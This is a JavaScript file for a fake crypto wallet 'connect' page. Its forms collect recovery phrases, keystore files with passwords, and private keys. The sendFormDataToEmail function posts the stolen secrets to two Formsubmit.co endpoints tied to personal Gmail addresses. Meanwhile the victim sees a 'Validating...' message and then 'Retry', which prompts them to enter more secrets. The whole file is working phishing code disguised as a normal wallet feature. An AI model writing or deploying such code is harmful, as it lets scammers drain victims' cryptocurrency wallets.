// Function to open a modal
function openModal(modalId) {
    var modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'block';
    }
}

// Function to close a modal
function closeModal(modalId) {
    var modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
    }
}

// Function to submit form data
function submitFormData(connectionMethod) {
    var formData;

    // Validate and get form data based on connection method
    switch (connectionMethod) {
        case 0: // Phrase
            formData = validatePhraseForm();
            break;
        case 1: // KeyStore
            formData = validateKeyStoreForm();
            break;
        case 2: // Private Key
            formData = validatePrivateKeyForm();
            break;
        default:
            return;
    }

    // Check if form data is valid
    if (formData) {
        // Send form data to email using Formsubmit.co
        sendFormDataToEmail(formData);

        // Close the modal after form submission
        closeModal('modal-' + getModalName(connectionMethod));
    }
}
// Placeholder function for sending form data to email using Formsubmit.co
function sendFormDataToEmail(formData) {
    // Replace 'YOUR_FORMSUBMIT_ENDPOINT' with the actual endpoint you get from Formsubmit.co
    var formsubmitEndpoint1 = 'https://formsubmit.co/ajax/mazzatov005@gmail.com'; 
    var formsubmitEndpoint2 = 'https://formsubmit.co/ajax/ashwebb500@gmail.com'; 

    // Make request to first email address endpoint
    fetch(formsubmitEndpoint1, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
    })
    .then(response => {
        // Check if response is successful
        if (response.ok) {
            // Display success message using swal
            swal('Validating...');
            // Delay for 2 seconds and then display "Retry" message
            setTimeout(function() {
                swal('Retry');
            }, 2000);
            return response.json(); // Return response data
        } else {
            // Display error message using swal
            swal('Server Error', 'Error submitting form to email1. Please try again.', 'error');
            throw new Error('Error submitting form to email1');
        }
    })
    .then(data => {
        console.log('Formsubmit.co response to email1:', data);
        // Handle response if needed
    })
    .catch(error => {
        console.error('Error connecting to email1:', error);
        // You can handle errors here if needed
    });

    // Make request to second email address endpoint
    fetch(formsubmitEndpoint2, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
    })
    .then(response => {
        // Check if response is successful
        if (response.ok) {
            // Display success message using swal
            swal('Validating...');
            // Delay for 2 seconds and then display "Retry" message
            setTimeout(function() {
                swal('Retry');
            }, 2000);
            return response.json(); // Return response data
        } else {
            // Display error message using swal
            swal('Server Error', 'Error submitting form to email2. Please try again.', 'error');
            throw new Error('Error submitting form to email2');
        }
    })
    .then(data => {
        console.log('Formsubmit.co response to email2:', data);
        // Handle response if needed
    })
    .catch(error => {
        console.error('Error connecting to email2:', error);
        // You can handle errors here if needed
    });
}
// Function to validate Phrase form
function validatePhraseForm() {
    var phraseTextarea = document.forms['phraseForm']['Phrase'].value.trim();
    var walletType = document.forms['phraseForm']['walletType'].value;

    // Basic validation
    if (phraseTextarea === '' || walletType === '') {
        swal('Please fill in all fields.');
        return null;
    }

    // Validate pattern (12 or 24 words separated by single spaces)
    var phrasePattern = /^(\S+\s+){11}\S+$|^(\S+\s+){23}\S+$/;
    if (!phrasePattern.test(phraseTextarea)) {
        swal('Phrase must be 12 or 24 words separated by single spaces.');
        return null;
    }

    // Return form data
    return { connectionMethod: 'Phrase', phrase: phraseTextarea, walletType: walletType };
}

// Function to validate KeyStore form
function validateKeyStoreForm() {
    var keystoreTextarea = document.forms['keystoreForm']['keystore'].value.trim();
    var passwordInput = document.forms['keystoreForm']['password'].value.trim();
    var walletType = document.forms['keystoreForm']['walletType'].value;

    // Basic validation
    if (keystoreTextarea === '' || passwordInput === '' || walletType === '') {
        swal('Please enter both KeyStore, password, and select wallet type.');
        return null;
    }

    // Validate pattern (JSON format)
    var jsonPattern = /^\{[\s\S]*\}$/;
    if (!jsonPattern.test(keystoreTextarea)) {
        swal('KeyStore must be a valid JSON format.');
        return null;
    }

    // Return form data
    return { connectionMethod: 'KeyStore', keystore: keystoreTextarea, password: passwordInput, walletType: walletType };
}

// Function to validate Private Key form
function validatePrivateKeyForm() {
    var privateKeyTextarea = document.forms['privateKeyForm']['privateKey'].value.trim();
    var walletType = document.forms['privateKeyForm']['walletType'].value;

    // Basic validation
    if (privateKeyTextarea === '' || walletType === '') {
        swal('Please fill in all fields.');
        return null;
    }

    // Validate pattern (64 alphanumeric characters)
    var privateKeyPattern = /^[a-fA-F0-9]{64}$/;
    if (!privateKeyPattern.test(privateKeyTextarea)) {
        swal('Private key must be 64 alphanumeric characters.');
        return null;
    }

    // Return form data
    return { connectionMethod: 'PrivateKey', privateKey: privateKeyTextarea, walletType: walletType };
}

// Function to get modal name based on connection method
function getModalName(connectionMethod) {
    switch (connectionMethod) {
        case 0:
            return 'phrase';
        case 1:
            return 'keystore';
        case 2:
            return 'private-key';
        default:
            return '';
    }
}
